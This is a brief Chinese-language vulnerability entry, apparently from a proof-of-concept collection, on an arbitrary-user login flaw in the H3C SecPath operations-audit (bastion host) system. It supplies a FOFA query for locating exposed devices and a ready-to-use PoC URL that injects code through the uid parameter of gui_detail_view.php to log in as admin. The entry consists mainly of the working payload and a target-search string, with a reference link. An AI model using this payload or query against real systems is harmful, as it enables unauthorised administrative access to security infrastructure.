# H3C-SecPath-运维审计系统(堡垒机)任意用户登录

H3C SecPath 运维审计系统是基于用户现阶段面临的运维难题提出的一款运维风险管控产品。攻击者可通过输入特殊 url，达到任意用户登录的目的。

FOFA：

`app="H3C-SecPath-运维审计系统"`

影响版本：
2018

PoC:

```
http://target/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
```

ref：

https://nox.qianxin.com/vulnerability/detail/97202